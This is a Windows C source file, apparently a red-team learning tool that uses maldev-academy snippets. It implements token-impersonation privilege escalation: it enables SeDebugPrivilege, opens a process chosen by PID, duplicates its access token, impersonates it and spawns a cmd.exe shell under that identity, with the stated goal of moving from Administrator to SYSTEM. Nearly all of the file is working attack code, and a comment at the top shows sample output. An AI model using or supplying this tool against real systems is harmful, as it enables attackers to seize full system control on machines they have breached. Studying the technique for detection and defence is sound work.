#include <Windows.h>
#include <stdio.h>
#include "Structs.h"


/*
Given a process ID (PID), impersonate the user associated with the process.
This is useful for privilege escalation from Administrator to SYSTEM privileges.
Some test with maldev-academy code snippets.

 .\ImpersonateProcessUser.exe <PID>
[+] SeDebugPrivilege is enabled.
[+] Process launched successfully with impersonated user.
[+] The token is elevated.
[+] Reverted to original security user context.
*/
/*
 * SetDebugPrivilege
 * -----------------
 * Attempts to enable the SeDebugPrivilege for the calling process. This privilege
 * allows the process to debug and adjust the memory of other processes, typically
 * required for tasks that need access to system-level processes or for certain types
 * of monitoring and debugging operations.
 *
 * Parameters:
 * - None.
 *
 * Returns:
 * - TRUE if the SeDebugPrivilege is successfully enabled.
 * - FALSE if the function fails to enable the privilege. This could be due to
 *   insufficient permissions of the calling process or failures in the steps required
 *   to adjust the token privileges.
 *
 * Notes:
 * - The function works by first obtaining the current process's token, then adjusting
 *   its privileges to include SeDebugPrivilege.
 * - This function is essential for applications that need to interact closely with
 *   system processes or require elevated privileges to perform their operations.
 * - Care should be taken when enabling SeDebugPrivilege due to the powerful access it
 *   grants. It should only be used by trusted and secure applications.
 * - The calling process must have the appropriate permissions to adjust its privileges.
 *   Typically, this means the process must be running with administrative privileges.
 * - Proper error handling is included to provide diagnostics in case of failure. The
 *   function uses GetLastError to determine the cause of failure in operations like
 *   opening the process token or adjusting privileges.
 */


BOOL SetDebugPrivilege() {

    BOOL	            bResult = FALSE;
    TOKEN_PRIVILEGES	TokenPrivs = { 0x00 };
    LUID				Luid = { 0x00 };
    HANDLE	            hCurrentTokenHandle = NULL;

    if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentTokenHandle)) {
        printf("[!] OpenProcessToken Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid)) {
        printf("[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    TokenPrivs.PrivilegeCount = 0x01;
    TokenPrivs.Privileges[0].Luid = Luid;
    TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hCurrentTokenHandle, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        printf("[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] Not All Privileges Referenced Are Assigned To The Caller \n");
        goto _END_OF_FUNC;
    }    

    bResult = TRUE;

_END_OF_FUNC:
    if (hCurrentTokenHandle)
        CloseHandle(hCurrentTokenHandle);
    return bResult;
}
/**
 * Checks if the SeDebugPrivilege is enabled for the current process.
 *
 * This function determines whether the current process has the SeDebugPrivilege
 * enabled, which allows the process to perform debugging operations that require
 * elevated privileges, such as accessing system processes and tokens. This privilege
 * is critical for tasks that involve manipulating other processes' security tokens
 * or require elevated access to system components.
 * 
 */

BOOL IsDebugPrivilegeEnabled() {
    HANDLE hToken;
    DWORD dwSize;
    PTOKEN_PRIVILEGES pTokenPrivileges;
    BOOL bResult = FALSE;
    LUID luidDebugPrivilege;

    // Retrieve the LUID for SeDebugPrivilege.
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidDebugPrivilege)) {
        printf("[!] LookupPrivilegeValue Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    // Open the current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    // Get the size required for the TOKEN_PRIVILEGES structure
    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printf("[!] GetTokenInformation Failed With Error: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    // Allocate memory for the TOKEN_PRIVILEGES structure
    pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwSize);
    if (pTokenPrivileges == NULL) {
        printf("[!] Memory Allocation Failed\n");
        CloseHandle(hToken);
        return FALSE;
    }

    // Retrieve the token information
    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwSize, &dwSize)) {
        printf("[!] GetTokenInformation Failed With Error: %d\n", GetLastError());
        free(pTokenPrivileges);
        CloseHandle(hToken);
        return FALSE;
    }

    // Check if SeDebugPrivilege is enabled
    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
        if (pTokenPrivileges->Privileges[i].Luid.LowPart == luidDebugPrivilege.LowPart &&
            pTokenPrivileges->Privileges[i].Luid.HighPart == luidDebugPrivilege.HighPart) {
            if ((pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) == SE_PRIVILEGE_ENABLED) {
                bResult = TRUE;
            }
            break;
        }
    }

    // Clean up
    free(pTokenPrivileges);
    CloseHandle(hToken);

    return bResult;
}
/*
 * ImpersonateProcess
 * ------------------
 * Impersonates the user associated with a specified process ID (PID).
 * This function is designed for scenarios where you need to adopt the security context
 * of another process, potentially escalating privileges if the target process has higher privileges.
 * It leverages SeDebugPrivilege to open the target process and duplicate its token for impersonation.
 *
 * Parameters:
 * - dwProcessId: The DWORD representing the PID of the target process to impersonate.
 *
 * Returns:
 * - TRUE if the function successfully impersonates the target process.
 * - FALSE if it fails at any step, including enabling SeDebugPrivilege, opening the target process,
 *   duplicating the token, or impersonating the duplicated token.
 *
 * Notes:
 * - The function assumes that the caller has the necessary privileges to enable SeDebugPrivilege
 *   and to open the target process. It will attempt to enable SeDebugPrivilege but may fail
 *   if the calling process lacks the necessary permissions.
 * - The caller is responsible for reverting the impersonation when no longer needed by calling RevertToSelf.
 * - The function prints detailed error messages to standard output for each step where it may fail,
 *   assisting in debugging and troubleshooting.
 */

BOOL ImpersonateProcess(DWORD dwProcessId) {

    HANDLE  hProcess = NULL,
        hProcessToken = NULL,
        hDuplicatedToken = NULL;
    BOOL    bResult = FALSE;

    // SeDebugPrivilege must be enabled prior to OpenProcess
    if (!SetDebugPrivilege()) {
        printf("[!] SeDebugPrivilege could not be enabled");
        return FALSE;
    }

    if ((hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId)) == NULL) {
        printf("[!] OpenProcess Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hProcessToken)) {
        printf("[!] OpenProcessToken Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!DuplicateTokenEx(hProcessToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDuplicatedToken)) {
        printf("[!] DuplicateTokenEx Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }


    if (!ImpersonateLoggedOnUser(hDuplicatedToken)) {
        printf("[!] ImpersonateLoggedOnUser Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }
    // Check LaunchCommandWithImpersonatedUser
    if (!LaunchCommandWithImpersonatedUser(hDuplicatedToken, NULL)) {
        printf("[!] Failed to launch command with impersonated user.\n");
    }

    IsTokenElevated(hDuplicatedToken);
    bResult = TRUE;

_END_OF_FUNC:
    if (hDuplicatedToken)
        CloseHandle(hDuplicatedToken);
    if (hProcessToken)
        CloseHandle(hProcessToken);
    if (hProcess)
        CloseHandle(hProcess);
    return bResult;
}
/*
 * LaunchCommandWithImpersonatedUser
 * ----------------------------------
 * Attempts to launch a new process using a specified impersonated user token.
 * This function is useful for running commands or applications under the security context
 * of a different user, particularly after obtaining and duplicating their token
 * through impersonation techniques.
 *
 * Parameters:
 * - hDuplicatedToken: A handle to the duplicated token of the impersonated user.
 *                     This token is used to launch the new process with the user's privileges.
 * - lpApplicationName: A pointer to a null-terminated string specifying the full path
 *                      of the module to be executed. This parameter can be NULL if the
 *                      executable name is included in the lpCommandLine parameter of
 *                      the CreateProcessWithTokenW or CreateProcessAsUserW function call.
 *
 * Returns:
 * - TRUE if the new process is successfully launched with the impersonated user's token.
 * - FALSE if the function fails at any point, including issues with launching the process
 *   due to permission errors or invalid parameters.
 *
 * Notes:
 * - This function uses either CreateProcessWithTokenW or CreateProcessAsUserW (depending on
 *   the specific implementation and requirements) to create the process with the specified token.
 * - It's essential that the calling process has the appropriate privileges to use the token
 *   for process creation, typically requiring SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.
 * - Error handling within the function provides insights into why process creation might fail,
 *   leveraging GetLastError to obtain detailed error codes.
 * - The caller should ensure that the hDuplicatedToken has the necessary access rights
 *   and was obtained through proper impersonation of the target user.
 */

BOOL LaunchCommandWithImpersonatedUser(HANDLE hDuplicatedToken, LPCWSTR lpApplicationName) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    BOOL bResult = FALSE;

    // launch cmd 
    LPCWSTR lpCommandLine =
        L"C:\\Windows\\system32\\cmd.exe /c "
        L"echo [+] Your user now is ... && "
        L"whoami && "
        L"echo [+] Spawning your shell ... && "
        L"cmd.exe";
    

    bResult = CreateProcessWithTokenW(hDuplicatedToken, LOGON_WITH_PROFILE, lpApplicationName, (LPWSTR)lpCommandLine, 0, NULL, NULL, &si, &pi);
    if (!bResult) {
        DWORD dwError = GetLastError();
        switch (dwError) {
        case ERROR_PRIVILEGE_NOT_HELD:
            wprintf(L"[!] Error: The caller does not have the required privileges (ERROR_PRIVILEGE_NOT_HELD).\n");
            break;
        case ERROR_CANNOT_IMPERSONATE:
            wprintf(L"[!] Error: Unable to impersonate using a named pipe until data has been read from that pipe (ERROR_CANNOT_IMPERSONATE).\n");
            break;            
        default:
            wprintf(L"[!] CreateProcessWithTokenW Failed With Error: %d\n", dwError);
        }
        return FALSE;
    }

    wprintf(L"[+] Process launched successfully with impersonated user.\n");
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

 /*
  * IsTokenElevated
  * ---------------
  * Determines whether the specified token represents an elevated process.
  * This is particularly useful in scenarios where an application needs to check
  * if it has elevated privileges (e.g., running as Administrator) to perform
  * certain actions that require such privileges.
  *
  * Parameters:
  * - hToken: A handle to the access token for a process or thread. This token is
  *           checked to determine if it has elevated privileges.
  *
  * Returns:
  * - TRUE if the token is elevated, indicating the process is running with
  *   administrative privileges.
  * - FALSE if the token is not elevated or if any errors occur during the check.
  *   This includes failure to query the token information.
  *
  * Notes:
  * - The function utilizes NtQueryInformationToken, an NT API function, to query
  *   the TokenElevation information class of the provided token.
  * - It's essential to pass a valid token handle to this function. The handle must
  *   have TOKEN_QUERY access rights.
  * - If the function cannot perform the query or if the token elevation status
  *   indicates the token is not elevated, FALSE is returned.
  * - This function is useful in security-sensitive applications that need to
  *   adapt their behavior based on the privilege level of the running context.
  */

 BOOL IsTokenElevated(IN HANDLE hToken) {
     NTSTATUS STATUS = 0x00;
     TOKEN_ELEVATION TknElvtion = { 0 };
     DWORD dwLength = sizeof(TOKEN_ELEVATION);
     fnNtQueryInformationToken pNtQueryInformationToken = NULL;
     BOOL bTokenIsElevated = FALSE;

     if (!hToken) {
         printf("[!] IsTokenElevated: Invalid token handle provided.\n");
         return FALSE;
     }

     // Dynamically retrieve the NtQueryInformationToken function.
     pNtQueryInformationToken = (fnNtQueryInformationToken)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationToken");
     if (!pNtQueryInformationToken) {
         printf("[!] GetProcAddress for NtQueryInformationToken failed with error: %d\n", GetLastError());
         return FALSE;
     }

     // Query the token's elevation status.
     STATUS = pNtQueryInformationToken(hToken, TokenElevation, &TknElvtion, dwLength, &dwLength);
     if (STATUS != 0x00) {
         printf("[!] NtQueryInformationToken failed with status: 0x%lx\n", STATUS);
         return FALSE;
     }

     bTokenIsElevated = TknElvtion.TokenIsElevated;

     if (bTokenIsElevated) {
         printf("[+] The token is elevated.\n");
     }
     else {
         printf("[-] The token is not elevated.\n");
     }

     return bTokenIsElevated;
 }


int wmain(int argc, WCHAR** argv, WCHAR** envp)
{
    if (!IsUserAnAdmin()) {
        wprintf(L"[+] Local Admin privileges needed to run this program !");
        return -1;
    }
    if (argc != 2) // Expecting two arguments now: PID and security service name
    {
        wprintf(L"Usage: program needs a PID number passed as argument");
        return -1;
    }
    
    __int64 dwProcessId = _wtoi(argv[1]); //target process  

    if (!dwProcessId)
    {
        wprintf(L"PID should be a number.\r\n");
        wprintf(L"PID process is #%lld.\r\n", dwProcessId);
        return -2;
    }
    if (SetDebugPrivilege()) {
        if (IsDebugPrivilegeEnabled()) {
            printf("[+] SeDebugPrivilege is enabled.\n");
        }
        else {
            printf("[!] SeDebugPrivilege is not enabled. Cannot proceed with impersonation.\n");
            return -1; 
        }
    }
    else {
        printf("[!] Failed to set SeDebugPrivilege.\n");
        return -1; 
    }
    // Token impersonation 
    ImpersonateProcess(dwProcessId); 


    // After impersonation tasks are done, revert the security context. 
    if (!RevertToSelf()) {
        printf("[!] Revert failed with error: %d\n", GetLastError());
    }
    else {
        printf("[+] Reverted to original security user context.\n");
    }
}